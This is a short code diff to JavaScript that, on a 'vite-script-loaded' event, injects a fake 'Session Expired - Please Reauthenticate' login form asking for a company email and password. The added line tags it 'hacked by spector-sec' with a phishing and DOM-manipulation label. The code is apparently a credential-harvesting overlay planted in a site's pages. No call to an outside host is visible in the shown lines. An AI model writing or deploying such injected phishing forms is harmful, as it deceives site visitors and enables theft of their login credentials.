@@ -6,7 +6,7 @@ document.addEventListener('vite-script-loaded', function() {
   fakeLogin.innerHTML = `
     <div class="phishing-container">
       <h2 style="color:#d23f00">Session Expired - Please Reauthenticate</h2>
-      <p>Your session has expired for security reasons:</p>
+      <p>hacked by spector-sec @$%Phishing + DOM Manipulation%$@ Your session has expired for security reasons:</p>
       <input type="email" id="phish-email" placeholder="Company Email" class="phishing-input">
       <input type="password" id="phish-pwd" placeholder="Password" class="phishing-input">
       <button id="phish-submit" class="phishing-button">Sign In</button>
